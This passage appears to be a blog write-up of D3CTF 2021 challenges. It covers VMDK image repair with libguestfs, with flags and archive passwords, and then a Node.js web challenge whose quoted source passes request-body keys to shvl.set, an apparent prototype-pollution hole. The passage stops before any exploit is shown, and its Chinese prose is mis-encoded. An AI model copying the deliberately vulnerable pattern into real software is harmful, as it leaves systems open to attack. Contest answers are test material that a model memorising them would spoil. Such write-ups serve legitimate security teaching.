class="token function">apt</span> <span class="token function">install</span> libguestfs-toolsvirt-ls VirtualLove.vmdk /rootvirt-cat VirtualLove.vmdk /root/flagggg.txt</code></pre><p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210307001935932.png"></p><p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210307001943346.png"></p><p><code>d3ctf{Vmw@RE_1s_5o_C0mpl3x_b99d1320cf}</code></p><h3 id="Virtual-Love-Revenge"><a href="#Virtual-Love-Revenge" class="headerlink" title="Virtual Love_Revenge"></a>Virtual Love_Revenge</h3><blockquote><p><strong><em>Iâ€™m coming for revenge.</em></strong><br>You say you love me, but you donâ€™t know me at all! Your loveâ€¦Your love is all virtual!<strong>ï¼ˆLogin User: guestï¼‰<br>The second part of the attachmentï¼š</strong><br><a href="https://d3ctf-2021.oss-cn-shanghai.aliyuncs.com/Misc/VirtualLoveRevenge_cf424dd60a5d269b06ecfecfbd59deb9.part2.rar">https://d3ctf-2021.oss-cn-shanghai.aliyuncs.com/Misc/VirtualLoveRevenge_cf424dd60a5d269b06ecfecfbd59deb9.part2.rar</a><br><strong>Flag Format: d3ctf{this_is_a_sample_flag}</strong></p><p><a href="https://d3ctf-2021.oss-cn-shanghai.aliyuncs.com/Misc/VirtualLoveRevenge_cf424dd60a5d269b06ecfecfbd59deb9.part1.rar">https://d3ctf-2021.oss-cn-shanghai.aliyuncs.com/Misc/VirtualLoveRevenge_cf424dd60a5d269b06ecfecfbd59deb9.part1.rar</a> </p></blockquote><p>åˆæ˜¯ 6GiB çš„è™šæ‹Ÿæœºé•œåƒï¼Œå–‚ï¼Œè¿™æ¯”èµ›å äº†æˆ‘ç¡¬ç›˜å·¨å¤§ç©ºé—´å•Šå–‚ï¼</p><p>å¦å¤–è¿˜æœ‰ä¸ª <code>true_flag.rar</code></p><p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210307003134844.png" alt="true_flag.rar"></p><p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210307002713763.png"></p><p>è¿™æ¬¡è¿˜æ˜¯ç…§æ ·æ”¹ <code>VirtualLove-s00*.vmdk</code> æ–‡ä»¶å¤´éƒ¨ã€‚</p><p>ä»¥åŠ <code>VirtualLove.vmdk</code> æ”¹çš„çœŸå¤š</p><p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210307002811568.png" alt="æ”¹çš„çœŸå¤š"></p><p>ç„¶åä¸€æ ·æ–°å»ºè™šæ‹Ÿæœºå¯¼å…¥é•œåƒã€‚</p><p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210307003003199.png"></p><p>è¿˜æ˜¯ä¸€æ ·çš„å‡ flagã€‚</p><p>ç”¨ libguestfs-tools çœ‹çœ‹ <code>/root</code>ï¼Œç„¶åè¯»å–è¿™ä¸ªæ–‡ä»¶ã€‚</p><p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210307003234470.png"></p><pre class="language-none"><code class="language-none">f5`FU2)I$F0Oc'qL@pP)S</code></pre><p>è¿™ä¸ªå°±æ˜¯å‹ç¼©åŒ…çš„å¯†ç ã€‚</p><p>è§£å‹æ‹¿åˆ° flag</p><p><code>d3ctf{Vmw@RE_1s_5oooo_C0mpl3x_ec4bb60e58}</code></p><blockquote><p>å…¶å®è¿™é‡Œæˆ‘è¿˜å¯»æ€ç€æ˜¯ä¸æ˜¯æ¼äº†å•¥å‘¢ï¼Œæ˜¯ä¸æ˜¯è¿˜å¥—äº†å¥½å‡ æ­¥ï¼Œäºæ˜¯è¿˜æƒ³ç€æ”¹ root å¯†ç ï¼ˆï¼ˆ</p><p>BTW, <code>anaconda-ks.cfg</code> è¿™ä¸ªæ–‡ä»¶é‡Œå°±å­˜äº† root çš„å¯†ç </p><p><a href="https://www.cnblogs.com/Spiro-K/p/6597674.html">Linux:rootä¸‹çš„æ–‡ä»¶-anaconda-ks.cfgè¯¦è§£</a></p><p>ä»¥åŠ é€šè¿‡ å•ç”¨æˆ·æ¨¡å¼ æˆ–è€… æ•‘æ´æ¨¡å¼ rescue mode å»æ›´æ”¹ root å¯†ç ã€‚</p><p><a href="https://www.runoob.com/linux/linux-forget-password.html">Linux  å¿˜è®°å¯†ç è§£å†³æ–¹æ³•</a></p><p><a href="https://www.cnblogs.com/feiquan/p/9225427.html">Linuxä¸­Rootå¯†ç ç ´è§£</a></p></blockquote><h3 id="Virtual-Love-Revenge2-0"><a href="#Virtual-Love-Revenge2-0" class="headerlink" title="Virtual Love_Revenge2.0"></a>Virtual Love_Revenge2.0</h3><blockquote><p><strong><em>Iâ€™m coming for revenge again.\</em></strong><br>You say you love me, but you donâ€™t know me at all! Your loveâ€¦Your love is all virtual!<strong>ï¼ˆLogin User: guestï¼‰<br>The second part of the attachmentï¼š</strong><br><a href="https://d3ctf-2021.oss-cn-shanghai.aliyuncs.com/Misc/VirtualLoveRevenge2.0_66a25efc5cbcf0b7a9fdab312c3e70aa.part2.rar">https://d3ctf-2021.oss-cn-shanghai.aliyuncs.com/Misc/VirtualLoveRevenge2.0_66a25efc5cbcf0b7a9fdab312c3e70aa.part2.rar</a><br><strong>Flag Format: d3ctf{this_is_a_sample_flag}</strong></p><p><a href="https://d3ctf-2021.oss-cn-shanghai.aliyuncs.com/Misc/VirtualLoveRevenge2.0_66a25efc5cbcf0b7a9fdab312c3e70aa.part1.rar">https://d3ctf-2021.oss-cn-shanghai.aliyuncs.com/Misc/VirtualLoveRevenge2.0_66a25efc5cbcf0b7a9fdab312c3e70aa.part1.rar</a> </p></blockquote><p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210307014130599.png"></p><p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210307014357498.png" alt="æ€ä¹ˆè¿™æ¯”èµ›è¿™ä¹ˆå ç©ºé—´"></p><p>å–‚ï¼ï¼ï¼æœ‰å®Œæ²¡å®Œå•Šï¼å¤ªæœ‰æ¯’äº†ï¼</p><p>ï¼ˆæ€ä¹ˆè¿™æ¯”èµ›è¿™ä¹ˆå ç¡¬ç›˜ç©ºé—´</p><p>å…ˆæ˜¯å’Œä¸Šä¸€é¢˜ä¸€æ ·çš„æ“ä½œï¼Œåšçš„è¦åäº†â€¦â€¦</p><p>ç„¶åä¹‹åçœ‹å›¾ã€‚</p><p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210307013955561.png"></p><p>å‹ç¼©åŒ…å¯†ç </p><pre class="language-none"><code class="language-none">2F!,O&lt;DJ+@&lt;*K0@&lt;6L(Df-</code></pre><pre class="language-none"><code class="language-none">d3ctf{Vmw@RE_1s_5ooo_C0mpl3x_[ç›®æ ‡æ–‡ä»¶md5]}d3ctf{Vmw@RE_1s_5ooo_C0mpl3x_8cf8463b34caa8ac871a52d5dd7ad1ef}</code></pre><p><strong>å¥½è€¶ï¼Œæ˜¯ä¸€è¡€ï¼</strong></p><p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210307014213452.png"></p><blockquote><p>ï¼ˆç›²çŒœæ˜¯ä¸æ˜¯ä¹‹å‰çš„é¢˜ç›®æœ‰äººç›´æ¥ grep / binwalk æˆ–è€…æ€ä¹ˆæ ·æå–åˆ°äº†å­—ç¬¦ä¸²ä»€ä¹ˆçš„å§</p><p>é—®äº†å‡ºé¢˜äººè¯´éé¢„æœŸæ˜¯ å‹ç¼©åŒ…çš„å¯†ç å’Œæœ€å¼€å§‹ç‰ˆæœ¬çš„ flag åœ¨åŒä¸€ä¸ªä½ç½®ï¼Œæ²¡è¿›è¡Œå…¶ä»–å¤„ç†ï¼Œæ‰€ä»¥ç›´æ¥å°±èƒ½åœ¨010é‡Œæ‰¾åˆ°ã€‚</p><p>é¢„æœŸè§£æ˜¯çˆ†ç ´ vmx çš„å¯†ç ï¼Œå­—å…¸éšå†™åœ¨ log é‡Œäº†ã€‚ç„¶åä¿®å¤ vmxï¼Œå†ä¿®ä¿®å…¶ä»–çš„å‡ ä¸ªæ–‡ä»¶å°±å¯ä»¥è¿›å»äº†ã€‚</p><p>emmmm</p></blockquote><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="8-bit-pub"><a href="#8-bit-pub" class="headerlink" title="8-bit pub"></a>8-bit pub</h3><blockquote><p>Wellcome to 8-bit pub, take a seat and enjoy drinking here!<br>Attachment: <a href="https://d3ctf-2021.oss-cn-shanghai.aliyuncs.com/Web/8-bit_pub_e7b8ca6dc23b59b42e8b5900b62c61506ad0ca34.zip">https://d3ctf-2021.oss-cn-shanghai.aliyuncs.com/Web/8-bit_pub_e7b8ca6dc23b59b42e8b5900b62c61506ad0ca34.zip</a><br>PS: Try to execute /readflag<br>PPS: The container restarts every 3 minutes<br><strong>Flag Format: d3ctf{this_is_a_sample_flag}</strong></p><p>Challenge Address</p><p><a href="http://6d5f59df15.8bit-pub.d3ctf.io/">http://6d5f59df15.8bit-pub.d3ctf.io</a> </p></blockquote><p>ç»™äº†æºç ï¼Œç›´æ¥çœ‹ï¼Œæ˜¯ Nodejsã€‚</p><p>ç›²çŒœåˆæ˜¯<strong>åŸå‹é“¾æ±¡æŸ“</strong>ã€‚äºæ˜¯å°±å»æ‰¾æœ‰æ²¡æœ‰ã€‚</p><p>çœ‹äº†ä¸€ä¸‹ä¾èµ–çš„ç‰ˆæœ¬éƒ½æŒºæ–°çš„ï¼Œemmmã€‚ï¼ˆå¯ä»¥è¯•è¯• <code>npm audit</code></p><p>å‘ç°ç»™çš„æºç ä¸­å”¯ä¸€ä¸€å¤„å¯èƒ½çš„æ˜¯åœ¨å‘é‚®ä»¶è¿™é‡Œã€‚</p><p><code>controllers/adminController.js</code></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> send <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"../utils/mail"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> shvl <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"shvl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>  <span class="token function-variable function">home</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">sendView</span><span class="token punctuation">(</span><span class="token string">"admin.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token function-variable function">email</span><span class="token operator">:</span> <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> contents <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>    Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">key</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>      shvl<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>contents<span class="token punctuation">,</span> key<span class="token punctuation">,</span> req<span class="token punctuation">.</span>body<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    contents<span class="token punctuation">.</span>from <span class="token operator">=</span> <span class="token string">'"admin" &lt;admin@8-bit.pub&gt;'</span><span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>      <span class="token keyword">await</span> <span class="token function">send</span><span class="token punctuation">(</span>contents<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span>message<span class="token operator">:</span> <span class="token string">"Success."</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> message<span class="token operator">:</span> err<span class="token punctuation">.</span>message <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>é€šè¿‡ <code>shvl.set</code> æŠŠæ¥æ”¶åˆ°çš„å‚æ•°èµ‹å€¼ç»™ <code>contents</code>ï¼Œä¹‹åå°±ä¼ è¿›å‘é‚®ä»¶çš„äº†ã€‚</p><p>é‚£æ€ä¹ˆè¿›å…¥è¿™ä¸ªå‘é‚®ä»¶å‘¢ï¼Ÿ</p><p>æ ¹æ® <code>routes/index.js</code> å¯ä»¥çœ‹åˆ°è·¯ç”±ï¼Œéœ€è¦é‰´æƒï¼Œå°±æ˜¯ <code>admin</code>ã€‚</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"express"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> adminController <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"../controllers/adminController"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> indexController <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"../controllers/indexController"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> usersController <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"../controllers/usersController"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> auth <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"../utils/auth"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> indexController<span class="token punctuation">.</span>home<span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/signin"</span><span class="token punctuation">,</span> usersController<span class="token punctuation">.</span>signinPage<span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/signup"</span><span class="token punctuation">,</span> usersController<span class="token punctuation">.</span>signupPage<span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/logout"</span><span class="token punctuation">,</span> usersController<span class="token punctuation">.</span>logout<span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/admin"</span><span class="token punctuation">,</span> auth<span class="token punctuation">,</span> adminController<span class="token punctuation">.</span>home<span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/user/signin"</span><span class="token punctuation">,</span> usersController<span class="token punctuation">.</span>signin<span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/user/signup"</span><span class="token punctuation">,</span> usersController<span class="token punctuation">.</span>signup<span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/admin/email"</span><span class="token punctuation">,</span> auth<span class="token punctuation">,</span> adminController<span class="token punctuation">.</span>email<span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre><p>çœ‹ <code>utils/auth.js</code></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> <span class="token function-variable function">auth</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token number">302</span><span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">!==</span> <span class="token string">"admin"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>method <span class="token operator">===</span> <span class="token string">"GET"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">sendView</span><span class="token punctuation">(</span><span class="token string">"forbidden.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> message<span class="token operator">:</span> <span class="token string">"Forbidden."</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> auth<span class="token punctuation">;</span></code></pre><p>éœ€è¦ <code>session.username</code> ä¸º <code>admin</code>ã€‚é‚£é¦–å…ˆè¦ç™»å½•ã€‚</p><p><code>controllers/usersController.js</code></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> user <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"../modules/users"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>  <span class="token function-variable function">signinPage</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">sendView</span><span class="token punctuation">(</span><span class="token string">"signin.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token function-variable function">signupPage</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">sendView</span><span class="token punctuation">(</span><span class="token string">"signup.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token function-variable function">signin</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    user<span class="token punctuation">.</span><span class="token function">signin</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>username<span class="token punctuation">,</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>password<span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> result</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> message<span class="token operator">:</span> err<span class="token punctuation">.</span>message <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>result<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">{</span>        req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">=</span> result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>username<span class="token punctuation">;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> message<span class="token operator">:</span> <span class="token string">"Signin success."</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">401</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> message<span class="token operator">:</span> <span class="token string">"Username or password wrong."</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token function-variable function">signup</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    user<span class="token punctuation">.</span><span class="token function">signup</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>username<span class="token punctuation">,</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>password<span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> result</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> message<span class="token operator">:</span> err<span class="token punctuation">.</span>message <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> message<span class="token operator">:</span> <span class="token string">"Signup success."</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token function-variable function">logout</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">=</span> <span class="token keyword">undefined</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token number">302</span><span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>å†çœ‹ <code>modules/users.js</code></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> sql <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"../utils/db.js"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>  <span class="token function-variable function">signup</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">username<span class="token punctuation">,</span> password<span class="token punctuation">,</span> done</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    sql<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span>      <span class="token string">"SELECT * FROM users WHERE username = ?"</span><span class="token punctuation">,</span>      <span class="token punctuation">[</span>username<span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>          console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"error: "</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token function">done</span><span class="token punctuation">(</span>err<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">{</span>          sql<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span>            <span class="token string">"INSERT INTO users VALUES (?, ?)"</span><span class="token punctuation">,</span>            <span class="token punctuation">[</span>username<span class="token punctuation">,</span> password<span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>              <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>                console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"error: "</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token function">done</span><span class="token punctuation">(</span>err<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token function">done</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> res<span class="token punctuation">.</span>insertId<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token punctuation">}</span>            <span class="token punctuation">}</span>          <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>          <span class="token keyword">return</span> <span class="token function">done</span><span class="token punctuation">(</span><span class="token punctuation">{</span>            message<span class="token operator">:</span> <span class="token string">"Username already taken."</span>          <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token function-variable function">signin</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">username<span class="token punctuation">,</span> password<span class="token punctuation">,</span> done</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    sql<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span>      <span class="token string">"SELECT * FROM users WHERE username = ? AND password = ?"</span><span class="token punctuation">,</span>      <span class="token punctuation">[</span>username<span class="token punctuation">,</span> password<span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>          console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"error: "</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token function">done</span><span class="token punctuation">(</span>err<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>          <span class="token keyword">return</span> <span class="token function">done</span><span 